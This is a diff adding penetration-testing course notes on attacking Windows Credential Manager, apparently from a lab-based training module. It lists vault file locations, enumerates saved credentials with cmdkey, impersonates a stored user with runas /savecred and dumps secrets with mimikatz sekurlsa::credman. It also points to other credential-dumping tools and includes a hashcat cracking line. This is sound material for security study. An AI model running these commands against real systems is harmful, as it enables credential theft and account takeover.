@@ -706,6 +706,159 @@ We will get an output
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
 
+---
+
+#  Attacking Windows Credential Manager
+
+**Credential Manager** is a Windows feature (since **Windows 7 / Server 2008 R2**) that securely stores credentials for users and applications.
+
+Microsoft refers to these encrypted stores as **Credential Lockers (Windows Vaults)**.
+
+
+
+## Credential Storage Locations (MITRE ATT&CK)
+
+Credentials are stored in encrypted folders protected by **DPAPI**:
+
+```text
+%UserProfile%\AppData\Local\Microsoft\Vault\
+%UserProfile%\AppData\Local\Microsoft\Credentials\
+%UserProfile%\AppData\Roaming\Microsoft\Vault\
+%ProgramData%\Microsoft\Vault\
+%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
+```
+
+* Each vault contains a **Policy.vpol** file
+* Uses **AES-128 / AES-256**
+* AES keys protected by **DPAPI**
+* Newer systems use **Credential Guard (VBS)**
+
+
+## Credential Types
+
+| Type                    | Description                                             |
+| ----------------------- | ------------------------------------------------------- |
+| **Web Credentials**     | Website & online account credentials (IE / legacy Edge) |
+| **Windows Credentials** | Domain logins, services, network shares, OneDrive       |
+
+
+
+## Exporting Credential Vaults
+
+Vaults can be exported as **`.crd`** files (password-protected):
+
+### GUI / DLL Method
+
+```cmd
+rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+
+
+## Enumerating Stored Credentials (cmdkey)
+
+### Check current user
+
+```cmd
+whoami
+```
+
+### List stored credentials
+
+```cmd
+cmdkey /list
+```
+
+### Output Fields Explained
+
+| Field           | Meaning                   |
+| --------------- | ------------------------- |
+| **Target**      | Resource or account       |
+| **Type**        | Generic / Domain Password |
+| **User**        | Associated username       |
+| **Persistence** | Saved across reboots      |
+
+
+## Interesting Credential Types
+
+### Ignore:
+
+```text
+virtualapp/didlogical
+```
+
+* Windows Live / Microsoft account
+* Random internal ID
+
+### Valuable:
+
+```text
+Domain:interactive=SRV01\mcharles
+```
+
+* Stored **domain credentials**
+* Can be impersonated
+
+
+
+## Impersonating Stored Credentials (runas)
+
+```cmd
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+➡ Opens a command prompt as **SRV01\mcharles** without needing the password again.
+
+
+
+## Extracting Credentials with Mimikatz
+
+### Launch mimikatz
+
+```cmd
+mimikatz.exe
+```
+
+### Enable debug privilege
+
+```mimikatz
+privilege::debug
+```
+
+### Dump Credential Manager secrets from LSASS
+
+```mimikatz
+sekurlsa::credman
+```
+
+### Example Output (Trimmed)
+
+```text
+Username : mcharles@inlanefreight.local
+Domain   : onedrive.live.com
+Password : ********
+```
+
+
+
+## Credential Extraction Methods
+
+| Method     | Description                         |
+| ---------- | ----------------------------------- |
+| `sekurlsa` | Dumps credentials from LSASS memory |
+| `dpapi`    | Manual decryption of vault files    |
+
+
+
+## Other Useful Tools
+
+* **SharpDPAPI**
+* **LaZagne**
+* **DonPAPI**
+
+
+---
+
 # Attacking Active Directory & NTDS.dit
 
 - **Definition**: Critical directory service in enterprise networks, primarily for managing Windows systems.
